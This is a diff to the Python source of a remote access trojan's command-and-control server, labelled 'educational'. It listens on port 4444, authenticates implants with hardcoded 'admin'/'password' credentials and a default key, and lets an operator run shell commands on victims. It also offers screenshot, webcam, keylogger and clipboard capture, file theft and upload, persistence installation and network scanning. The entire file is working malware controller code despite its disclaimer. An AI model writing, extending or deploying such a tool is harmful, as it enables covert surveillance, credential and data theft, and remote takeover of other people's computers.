@@ -1,23 +1,53 @@
 #!/usr/bin/env python3
-# Educational RAT Server - For learning purposes only
+# Educational RAT Server (CLI) - For learning purposes only
 # This program should only be used in controlled test environments
 
 import socket
 import os
 import sys
-import base64
 import threading
 import platform
 import time
+import json
 
-# Global variables
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+try:
+    from crypto_utils import send_msg, recv_msg, recv_msg_str, derive_key, AES_AVAILABLE
+except ImportError:
+    AES_AVAILABLE = False
+    import struct
+    def send_msg(sock, data, key=None):
+        if isinstance(data, str): data = data.encode()
+        sock.sendall(struct.pack('>I', len(data)) + data)
+    def recv_msg(sock, key=None):
+        raw = b""
+        while len(raw) < 4:
+            c = sock.recv(4 - len(raw))
+            if not c: return None
+            raw += c
+        n = struct.unpack('>I', raw)[0]
+        if n == 0: return b""
+        if n > 50_000_000: return None
+        data = b""
+        while len(data) < n:
+            c = sock.recv(min(65536, n - len(data)))
+            if not c: return None
+            data += c
+        return data
+    def recv_msg_str(sock, key=None):
+        d = recv_msg(sock, key)
+        return d.decode(errors='replace') if d is not None else None
+    def derive_key(password): return None
+
+ENCRYPTION_KEY = "edu_rat_default_key"
+
 clients = {}
+clients_lock = threading.Lock()
 current_client = None
 stop_flag = False
-prompt_symbol = "➤ "
-server_status = "idle"  # idle, listening, connected
 
-# Terminal colors for better UI (works on most platforms)
+
 class Colors:
     HEADER = '\033[95m'
     BLUE = '\033[94m'
@@ -27,497 +57,321 @@ class Colors:
     RED = '\033[91m'
     END = '\033[0m'
     BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
+
 
 def print_banner():
-    """Display the RAT server banner"""
     os.system('cls' if platform.system() == 'Windows' else 'clear')
-    banner = f"""
-    {Colors.BLUE}╔═══════════════════════════════════════════════════════════════╗{Colors.END}
-    {Colors.BLUE}║{Colors.END} {Colors.BOLD}Educational Remote Access Tool - Server{Colors.END}                 {Colors.BLUE}║{Colors.END}
-    {Colors.BLUE}║{Colors.END} {Colors.RED}IMPORTANT: For educational purposes only{Colors.END}                 {Colors.BLUE}║{Colors.END}
-    {Colors.BLUE}║{Colors.END} Use in controlled environments with proper authorization {Colors.BLUE}║{Colors.END}
-    {Colors.BLUE}╚═══════════════════════════════════════════════════════════════╝{Colors.END}
-    """
-    print(banner)
+    print(f"""
+    {Colors.BLUE}{'=' * 60}{Colors.END}
+    {Colors.BOLD}Educational Remote Access Tool - CLI Server{Colors.END}
+    {Colors.RED}IMPORTANT: For educational purposes only{Colors.END}
+    {Colors.BLUE}{'=' * 60}{Colors.END}
+    """)
 
-def print_status():
-    """Print current server status"""
-    global server_status, current_client
-    
-    status_line = f"{Colors.BOLD}Server Status:{Colors.END} "
-    
-    if server_status == "idle":
-        status_line += f"{Colors.YELLOW}Idle{Colors.END}"
-    elif server_status == "listening":
-        status_line += f"{Colors.GREEN}Listening for connections{Colors.END}"
-    
-    if current_client:
-        client_info = current_client["info"].split("|")[0].strip()  # Get just system info
-        status_line += f" | {Colors.BOLD}Connected to:{Colors.END} {Colors.GREEN}{client_info}{Colors.END}"
-    
-    connected = len(clients)
-    status_line += f" | {Colors.BOLD}Total connections:{Colors.END} {Colors.GREEN}{connected}{Colors.END}"
-    
-    print(f"\n{status_line}")
-
-def print_help(context="main"):
-    """Show available commands based on context"""
-    if context == "main":
-        help_text = f"""
-    {Colors.BOLD}Available Commands:{Colors.END}
-    ------------------
-    {Colors.GREEN}list{Colors.END}          - List all connected clients
-    {Colors.GREEN}select <id>{Colors.END}   - Select a client by ID
-    {Colors.GREEN}clear{Colors.END}         - Clear the screen
-    {Colors.GREEN}exit{Colors.END}          - Exit the server
-    {Colors.GREEN}help{Colors.END}          - Show this help message
-    """
-    elif context == "client":
-        help_text = f"""
-    {Colors.BOLD}Client Commands:{Colors.END}
-    ------------------
-    {Colors.GREEN}shell{Colors.END}         - Execute shell commands on target
-    {Colors.GREEN}sysinfo{Colors.END}       - Get detailed system information
-    {Colors.GREEN}upload <file>{Colors.END} - Upload a file to the client
-    {Colors.GREEN}download <file>{Colors.END} - Download a file from the client
-    {Colors.GREEN}screenshot{Colors.END}    - Capture client's screen
-    {Colors.GREEN}back{Colors.END}          - Return to main menu
-    {Colors.GREEN}help{Colors.END}          - Show this help message
-    """
-    print(help_text)
-
-def print_menu():
-    """Print the current menu"""
-    if current_client:
-        prompt = f"{Colors.BOLD}[Client {list(clients.keys())[list(clients.values()).index(current_client)]}]{Colors.END}{prompt_symbol}"
-    else:
-        prompt = f"{Colors.BOLD}[Server]{Colors.END}{prompt_symbol}"
-    return prompt
-
-def clear_screen():
-    """Clear terminal screen based on OS"""
-    os.system('cls' if platform.system() == 'Windows' else 'clear')
-    print_banner()
-    print_status()
 
 def setup_server(host, port):
-    """Set up and start the server"""
-    global server_status
-    
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
     try:
         server.bind((host, port))
         server.listen(5)
-        server_status = "listening"
+        server.settimeout(1.0)
         print(f"{Colors.GREEN}[+] Server listening on {host}:{port}{Colors.END}")
+        enc = "AES-256" if AES_AVAILABLE else "None"
+        print(f"{Colors.GREEN}[+] Encryption: {enc}{Colors.END}")
         return server
     except Exception as e:
         print(f"{Colors.RED}[!] Error starting server: {e}{Colors.END}")
         sys.exit(1)
 
-def accept_connections(server):
-    """Accept incoming client connections"""
-    global stop_flag
-    global clients
-    
+
+def accept_connections(server, auth_user, auth_pass):
+    global stop_flag, clients
+    key = derive_key(ENCRYPTION_KEY)
+
     while not stop_flag:
         try:
             client_socket, address = server.accept()
-            client_socket.setblocking(1)
-            
-            # Get client system information for identification
-            client_socket.send("sysinfo".encode())
-            client_info = client_socket.recv(1024).decode()
-            
-            # Assign client ID
-            client_id = len(clients) + 1
-            clients[client_id] = {
-                "socket": client_socket,
-                "address": address,
-                "info": client_info
-            }
-            
-            # Notify about new connection
-            print(f"\n{Colors.GREEN}[+] New connection established:{Colors.END} {address[0]}:{address[1]} (ID: {client_id})")
-            print(f"{Colors.GREEN}[+] Client info:{Colors.END} {client_info}")
-            print(print_menu(), end="", flush=True)
-            
+            client_socket.settimeout(15)
+            threading.Thread(target=handle_new_client,
+                             args=(client_socket, address, auth_user, auth_pass, key),
+                             daemon=True).start()
+        except socket.timeout:
+            continue
         except Exception as e:
             if not stop_flag:
-                print(f"\n{Colors.RED}[!] Error accepting connection: {e}{Colors.END}")
-                break
+                print(f"\n{Colors.RED}[!] Accept error: {e}{Colors.END}")
+            break
 
-def send_command(command):
-    """Send command to the current client"""
-    global current_client
-    
-    if not current_client:
-        print(f"{Colors.RED}[!] No client selected. Use 'select <id>' first.{Colors.END}")
-        return None
-    
+
+def handle_new_client(client_socket, address, auth_user, auth_pass, key):
+    global clients
     try:
-        current_client["socket"].send(command.encode())
-        
-        if command.startswith("download"):
-            # Receiving file from client
-            file_name = command.split(" ")[1]
-            print(f"{Colors.YELLOW}[*] Downloading {file_name}...{Colors.END}")
-            file_data = receive_file(current_client["socket"])
-            
-            if file_data:
-                with open(file_name, "wb") as f:
-                    f.write(file_data)
-                return f"{Colors.GREEN}[+] File downloaded successfully:{Colors.END} {file_name}"
-            else:
-                return f"{Colors.RED}[!] File download failed{Colors.END}"
-                
-        elif command.startswith("upload"):
-            # Sending file to client
-            file_name = command.split(" ")[1]
+        send_msg(client_socket, "AUTH", key)
+        creds_raw = recv_msg_str(client_socket, key)
+        if not creds_raw:
+            client_socket.close()
+            return
+        creds = json.loads(creds_raw)
+        if creds.get("username") != auth_user or creds.get("password") != auth_pass:
+            send_msg(client_socket, "AUTH_FAILED", key)
+            client_socket.close()
+            print(f"\n{Colors.RED}[!] Auth failed from {address[0]}:{address[1]}{Colors.END}")
+            return
+        send_msg(client_socket, "AUTH_SUCCESS", key)
+
+        send_msg(client_socket, "sysinfo", key)
+        info = recv_msg_str(client_socket, key)
+        if not info:
+            client_socket.close()
+            return
+
+        client_socket.settimeout(None)
+
+        with clients_lock:
+            cid = max(clients.keys(), default=0) + 1
+            clients[cid] = {
+                "socket": client_socket,
+                "address": address,
+                "info": info,
+                "key": key,
+                "last_seen": time.time(),
+            }
+        print(f"\n{Colors.GREEN}[+] New client #{cid} from {address[0]}:{address[1]}{Colors.END}")
+        print(f"{Colors.GREEN}[+] Info: {info}{Colors.END}")
+
+        # Command loop: handle unsolicited messages from the client (e.g. PING)
+        while True:
             try:
-                with open(file_name, "rb") as f:
-                    file_data = f.read()
-                
-                print(f"{Colors.YELLOW}[*] Uploading {file_name}...{Colors.END}")
-                file_size = len(file_data)
-                current_client["socket"].send(str(file_size).encode())
-                response = current_client["socket"].recv(1024).decode()
-                
-                if response == "ready":
-                    current_client["socket"].sendall(file_data)
-                    return current_client["socket"].recv(1024).decode()
-                else:
-                    return f"{Colors.RED}[!] Client not ready to receive file{Colors.END}"
-            except FileNotFoundError:
-                return f"{Colors.RED}[!] File not found: {file_name}{Colors.END}"
-                
-        elif command == "screenshot":
-            # Handle screenshot reception
-            print(f"{Colors.YELLOW}[*] Capturing screenshot...{Colors.END}")
-            response = current_client["socket"].recv(4)
-            if response == b"FAIL":
-                return f"{Colors.RED}[!] Screenshot failed on client (pyautogui may not be installed){Colors.END}"
-            
-            size = int(current_client["socket"].recv(10).decode())
-            current_client["socket"].send(b"ready")
-            
-            # Progress bar for large screenshots
-            screenshot_data = b""
-            downloaded = 0
-            
-            while downloaded < size:
-                chunk = current_client["socket"].recv(4096)
-                if not chunk:
+                command = recv_msg_str(client_socket, key)
+                if command is None:
                     break
-                screenshot_data += chunk
-                downloaded += len(chunk)
-                
-                # Show progress every 10%
-                progress = int(downloaded * 100 / size)
-                if progress % 10 == 0:
-                    print(f"{Colors.YELLOW}[*] Screenshot download: {progress}%{Colors.END}", end="\r")
-            
-            print(f"{Colors.YELLOW}[*] Screenshot download: 100%{Colors.END}")
-            
-            # Save screenshot
-            filename = f"screenshot_{current_client['address'][0]}_{time.strftime('%Y%m%d-%H%M%S')}.png"
-            with open(filename, "wb") as f:
-                f.write(screenshot_data)
-            
-            return f"{Colors.GREEN}[+] Screenshot saved as {filename}{Colors.END}"
-            
-        elif command == "sysinfo":
-            # For system info, wait for response and format it nicely
-            response = current_client["socket"].recv(4096).decode()
-            return format_system_info(response)
-            
-        else:
-            # For other commands, simply return the response
-            response = current_client["socket"].recv(4096).decode()
-            return response
-            
-    except Exception as e:
-        print(f"{Colors.RED}[!] Error communicating with client: {e}{Colors.END}")
-        return None
-
-def format_system_info(info_string):
-    """Format system info in a readable way"""
-    info_parts = info_string.split('|')
-    formatted = f"\n{Colors.BOLD}System Information:{Colors.END}\n" + "-" * 50 + "\n"
-    
-    for part in info_parts:
-        if ":" in part:
-            key, value = part.split(':', 1)
-            formatted += f"{Colors.BOLD}{key.strip()}:{Colors.END} {value.strip()}\n"
-    
-    return formatted
-
-def receive_file(client_socket):
-    """Receive a file from client"""
-    try:
-        # Get file size first
-        file_size_data = client_socket.recv(10).decode()
-        file_size = int(file_size_data)
-        
-        # Tell client we're ready to receive
-        client_socket.send("ready".encode())
-        
-        # Receive file data with progress indication
-        data = b""
-        downloaded = 0
-        
-        while downloaded < file_size:
-            chunk = client_socket.recv(4096)
-            if not chunk:
+                if command == "PING":
+                    send_msg(client_socket, "PONG", key)
+                    with clients_lock:
+                        if cid in clients:
+                            clients[cid]["last_seen"] = time.time()
+                    continue
+            except Exception:
                 break
-            data += chunk
-            downloaded += len(chunk)
-            
-            # Show progress every 10%
-            progress = int(downloaded * 100 / file_size)
-            if progress % 10 == 0:
-                print(f"{Colors.YELLOW}[*] File download: {progress}%{Colors.END}", end="\r")
-        
-        print(f"{Colors.YELLOW}[*] File download: 100%{Colors.END}")
-        return data
+
+        with clients_lock:
+            clients.pop(cid, None)
+
     except Exception as e:
-        print(f"{Colors.RED}[!] Error receiving file: {e}{Colors.END}")
-        return None
+        try:
+            client_socket.close()
+        except:
+            pass
+
 
 def list_clients():
-    """List all connected clients"""
     if not clients:
         print(f"{Colors.YELLOW}[!] No clients connected{Colors.END}")
         return
-        
     print(f"\n{Colors.BOLD}Connected Clients:{Colors.END}")
-    print("-" * 60)
-    print(f"{Colors.BOLD}ID  | IP Address       | Operating System      | Hostname{Colors.END}")
-    print("-" * 60)
-    
+    print("-" * 70)
     for cid, client in clients.items():
-        # Parse client info to get key details
-        info = client["info"]
-        os_info = "Unknown"
+        addr = f"{client['address'][0]}:{client['address'][1]}"
         hostname = "Unknown"
-        
-        for part in info.split("|"):
-            if "System:" in part:
-                os_info = part.split(":", 1)[1].strip()
+        for part in client["info"].split("|"):
             if "Node:" in part:
                 hostname = part.split(":", 1)[1].strip()
-        
-        print(f"{cid:<3} | {client['address'][0]:<15} | {os_info:<20} | {hostname}")
-    
-    print("-" * 60)
-    print(f"Total clients: {len(clients)}")
-    print()
+        enc = "AES" if client.get("key") else "Plain"
+        print(f"  #{cid}  [{enc}]  {addr:20s}  {hostname}")
+    print("-" * 70)
+    print(f"  Total: {len(clients)}\n")
 
-def handle_shell_mode(client_id):
-    """Handle interactive shell mode with a client"""
-    global current_client, prompt_symbol
-    
-    if client_id not in clients:
-        print(f"{Colors.RED}[!] Client ID {client_id} not found{Colors.END}")
+
+def interact_with_client(cid):
+    global current_client
+    if cid not in clients:
+        print(f"{Colors.RED}[!] Client #{cid} not found{Colors.END}")
         return
-    
-    current_client = clients[client_id]
-    client_os = "Unknown"
-    
-    for part in current_client["info"].split("|"):
-        if "System:" in part:
-            client_os = part.split(":", 1)[1].strip()
-    
-    print(f"{Colors.GREEN}[+] Entering interactive mode with Client {client_id} ({client_os}){Colors.END}")
-    print(f"{Colors.YELLOW}[*] Type 'help' for available commands, 'back' to return to main menu{Colors.END}")
-    
-    # Set appropriate shell prompt based on OS
-    if "Windows" in client_os:
-        shell_prompt = f"{Colors.BOLD}[Client {client_id} - Windows]{Colors.END}{prompt_symbol}"
-    elif "Linux" in client_os:
-        shell_prompt = f"{Colors.BOLD}[Client {client_id} - Linux]{Colors.END}{prompt_symbol}"
-    elif "Darwin" in client_os:
-        shell_prompt = f"{Colors.BOLD}[Client {client_id} - macOS]{Colors.END}{prompt_symbol}"
-    else:
-        shell_prompt = f"{Colors.BOLD}[Client {client_id}]{Colors.END}{prompt_symbol}"
-    
-    # Shell command mode
+
+    current_client = clients[cid]
+    sock = current_client["socket"]
+    key = current_client.get("key")
+    print(f"{Colors.GREEN}[+] Interacting with client #{cid}{Colors.END}")
+    print(f"{Colors.YELLOW}[*] Type 'back' to return, 'help' for commands{Colors.END}")
+
     while True:
         try:
-            cmd = input(shell_prompt).strip()
-            
-            if cmd.lower() == "back":
+            cmd = input(f"{Colors.BOLD}[Client #{cid}]> {Colors.END}").strip()
+            if not cmd:
+                continue
+            if cmd == "back":
                 current_client = None
                 print(f"{Colors.GREEN}[+] Returned to main menu{Colors.END}")
                 break
-                
-            elif cmd.lower() == "help":
-                print_help("client")
-                
-            elif cmd.lower() == "clear":
-                clear_screen()
-                
-            elif cmd:  # Only process non-empty commands
-                result = send_command(cmd)
-                if result:
-                    print(result)
-                    
+            if cmd == "help":
+                print(f"""
+  {Colors.BOLD}Commands:{Colors.END}
+    sysinfo, screenshot, webcam
+    keylogger_start/stop/dump
+    clipboard_start/stop/dump/current
+    download <file>, upload <file>
+    listdir [path], delete <file>
+    persist_install [method], persist_remove, persist_check
+    scan_network, scan_ports <ip>, scan_arp
+    capabilities, exit, back
+    (any other) = shell command
+""")
+                continue
+
+            if cmd == "screenshot":
+                send_msg(sock, "screenshot", key)
+                status = recv_msg_str(sock, key)
+                if status == "PASS":
+                    img_data = recv_msg(sock, key)
+                    if img_data:
+                        fname = f"screenshot_{time.strftime('%Y%m%d_%H%M%S')}.png"
+                        with open(fname, "wb") as f:
+                            f.write(img_data)
+                        print(f"{Colors.GREEN}[+] Saved: {fname} ({len(img_data)} bytes){Colors.END}")
+                else:
+                    print(f"{Colors.RED}[!] Screenshot failed{Colors.END}")
+
+            elif cmd == "webcam":
+                send_msg(sock, "webcam", key)
+                status = recv_msg_str(sock, key)
+                if status == "PASS":
+                    img_data = recv_msg(sock, key)
+                    if img_data:
+                        fname = f"webcam_{time.strftime('%Y%m%d_%H%M%S')}.jpg"
+                        with open(fname, "wb") as f:
+                            f.write(img_data)
+                        print(f"{Colors.GREEN}[+] Saved: {fname}{Colors.END}")
+                else:
+                    print(f"{Colors.RED}[!] Webcam failed{Colors.END}")
+
+            elif cmd.startswith("download "):
+                filepath = cmd.split(" ", 1)[1]
+                send_msg(sock, cmd, key)
+                status = recv_msg_str(sock, key)
+                if status == "PASS":
+                    file_data = recv_msg(sock, key)
+                    if file_data:
+                        local_name = os.path.basename(filepath)
+                        with open(local_name, "wb") as f:
+                            f.write(file_data)
+                        print(f"{Colors.GREEN}[+] Downloaded: {local_name} ({len(file_data)} bytes){Colors.END}")
+                else:
+                    print(f"{Colors.RED}[!] File not found on client{Colors.END}")
+
+            elif cmd.startswith("upload "):
+                filepath = cmd.split(" ", 1)[1]
+                if not os.path.isfile(filepath):
+                    print(f"{Colors.RED}[!] Local file not found: {filepath}{Colors.END}")
+                    continue
+                with open(filepath, "rb") as f:
+                    file_data = f.read()
+                send_msg(sock, f"upload {os.path.basename(filepath)}", key)
+                send_msg(sock, file_data, key)
+                response = recv_msg_str(sock, key)
+                print(f"{Colors.GREEN}{response}{Colors.END}")
+
+            elif cmd == "scan_network":
+                send_msg(sock, "scan_network", key)
+                progress = recv_msg_str(sock, key)
+                print(progress)
+                send_msg(sock, "ACK", key)
+                result = recv_msg_str(sock, key)
+                print(result)
+
+            elif cmd == "exit":
+                send_msg(sock, "exit", key)
+                clients.pop(cid, None)
+                current_client = None
+                print(f"{Colors.YELLOW}[+] Client disconnected{Colors.END}")
+                break
+
+            else:
+                send_msg(sock, cmd, key)
+                response = recv_msg_str(sock, key)
+                if response is None:
+                    print(f"{Colors.RED}[!] Connection lost{Colors.END}")
+                    clients.pop(cid, None)
+                    current_client = None
+                    break
+                print(response)
+
         except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[*] Use 'back' to return to main menu or 'exit' to quit{Colors.END}")
-            continue
-            
+            print(f"\n{Colors.YELLOW}[*] Type 'back' to return{Colors.END}")
         except Exception as e:
             print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
+            clients.pop(cid, None)
+            current_client = None
+            break
 
-def show_shell_tutorial():
-    """Show a brief tutorial for beginners on how to use shell commands"""
-    tutorial = f"""
-{Colors.BOLD}Shell Command Tutorial for Beginners:{Colors.END}
--------------------------------------
-{Colors.YELLOW}Common Windows Commands:{Colors.END}
-  dir                  - List files and directories
-  cd <directory>       - Change directory
-  type <file>          - Display file contents
-  systeminfo           - Display system information
-
-{Colors.YELLOW}Common Linux/macOS Commands:{Colors.END}
-  ls                   - List files and directories
-  cd <directory>       - Change directory
-  cat <file>           - Display file contents
-  uname -a             - Display system information
-
-{Colors.YELLOW}Universal Commands in RAT:{Colors.END}
-  sysinfo              - Get detailed system information
-  download <file>      - Download a file from target
-  upload <file>        - Upload a file to target
-  screenshot           - Take a screenshot of target's screen
-  back                 - Return to main menu
-"""
-    print(tutorial)
 
 def main():
-    """Main function to run the server"""
-    global current_client
     global stop_flag
-    global server_status
-    
+
     print_banner()
-    
-    host = "0.0.0.0"  # Listen on all interfaces
-    port = 4444       # Default port
-    
-    # Setup server
+
+    host = "0.0.0.0"
+    port = 4444
+    auth_user = "admin"
+    auth_pass = "password"
+
     server = setup_server(host, port)
-    
-    # Start thread to accept connections
-    conn_thread = threading.Thread(target=accept_connections, args=(server,))
-    conn_thread.daemon = True
+
+    conn_thread = threading.Thread(target=accept_connections,
+                                   args=(server, auth_user, auth_pass), daemon=True)
     conn_thread.start()
-    
-    print_status()
-    print_help()
-    
-    # Tutorial tip for beginners
-    print(f"{Colors.YELLOW}[Tip] Start by waiting for connections, then use 'list' to see connected clients.{Colors.END}")
-    
-    # Main command loop
+
+    print(f"""
+  {Colors.BOLD}Commands:{Colors.END}
+    list         - List connected clients
+    select <id>  - Interact with client
+    status       - Show server status
+    exit         - Shut down server
+""")
+
     while True:
         try:
-            cmd = input(print_menu()).strip()
-            
+            cmd = input(f"{Colors.BOLD}[Server]> {Colors.END}").strip()
+
             if cmd == "help":
-                if current_client:
-                    print_help("client")
-                else:
-                    print_help("main")
-                
-            elif cmd == "tutorial" or cmd == "tips":
-                show_shell_tutorial()
-                
-            elif cmd == "clear":
-                clear_screen()
-                
+                print("  list, select <id>, status, exit")
             elif cmd == "list":
                 list_clients()
-                
             elif cmd.startswith("select"):
                 try:
-                    client_id = int(cmd.split(" ")[1])
-                    handle_shell_mode(client_id)
+                    cid = int(cmd.split()[1])
+                    interact_with_client(cid)
                 except (IndexError, ValueError):
-                    print(f"{Colors.RED}[!] Invalid command format. Use 'select <id>'{Colors.END}")
-                    
+                    print(f"{Colors.RED}[!] Usage: select <id>{Colors.END}")
+            elif cmd == "status":
+                print(f"  Clients: {len(clients)}, Listening: {host}:{port}")
             elif cmd == "exit":
                 stop_flag = True
-                print(f"{Colors.YELLOW}[+] Shutting down server...{Colors.END}")
-                
-                # Close all client connections
-                for cid, client in clients.items():
-                    try:
-                        client["socket"].close()
-                    except:
-                        pass
-                
+                for c in clients.values():
+                    try: c["socket"].close()
+                    except: pass
                 server.close()
-                print(f"{Colors.GREEN}[+] Server closed.{Colors.END}")
+                print(f"{Colors.GREEN}[+] Server shut down{Colors.END}")
                 break
-                
-            elif cmd == "status":
-                print_status()
-                
             elif cmd == "":
-                # Just show the prompt again for empty commands
                 continue
-                
-            elif current_client:
-                # Forward command to selected client
-                result = send_command(cmd)
-                if result:
-                    print(result)
             else:
-                print(f"{Colors.RED}[!] Unknown command: '{cmd}'. Type 'help' to see available commands.{Colors.END}")
-                
+                print(f"{Colors.RED}[!] Unknown command. Type 'help'{Colors.END}")
+
         except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Press Ctrl+C again to exit or type 'exit'{Colors.END}")
-            try:
-                input()
-                continue
-            except KeyboardInterrupt:
-                print(f"\n{Colors.YELLOW}[+] Exiting...{Colors.END}")
-                stop_flag = True
-                
-                # Close all client connections
-                for cid, client in clients.items():
-                    try:
-                        client["socket"].close()
-                    except:
-                        pass
-                    
-                server.close()
-                break
-            
+            print(f"\n{Colors.YELLOW}[*] Type 'exit' to quit{Colors.END}")
         except Exception as e:
             print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
 
+
 if __name__ == "__main__":
-    # Check if terminal supports colors
     if platform.system() == "Windows":
-        # Enable ANSI colors on Windows
         try:
             import ctypes
             kernel32 = ctypes.windll.kernel32
             kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
         except:
-            # If it fails, disable colors
             for attr in dir(Colors):
                 if attr.isupper():
                     setattr(Colors, attr, '')
-    
-    try:
-        main()
-    except Exception as e:
-        print(f"Fatal error: {e}")
-        sys.exit(1) 
+    main()
